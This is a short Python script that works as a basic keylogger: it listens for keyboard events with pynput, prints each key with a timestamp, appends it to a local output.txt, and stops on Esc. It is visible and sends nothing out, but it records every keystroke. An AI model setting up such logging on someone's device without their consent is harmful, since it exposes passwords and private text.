# Import required modules from pynput.keyboard and time
import time
from pynput.keyboard import Key, Listener

# Define the output file name
outputFile = "output.txt"

# Define a dictionary to map special characters
special_characters = {
    '\x1a': '^Z',
    ' ': ' '  # Mapping space to space
}

# Function to handle key press events
def onKeyPress(key):
    currentTime = time.strftime("%H:%M:%S")
    char = special_characters.get(str(key), str(key))

    print(f'Press: {char} \t at {currentTime}')

    with open(outputFile, "a+") as file:
        file.write(f'{char} \t at {currentTime}\n')

# Function to handle key release events
def onKeyRelease(key):
    currentTime = time.strftime("%H:%M:%S")
    char = special_characters.get(str(key), str(key))

    print(f'Release: {char}')
    if key == Key.esc:
        return False

# Set up listener for keyboard events
with Listener(on_press=onKeyPress, on_release=onKeyRelease) as listener:
    listener.join()  # Start the listener and wait for events
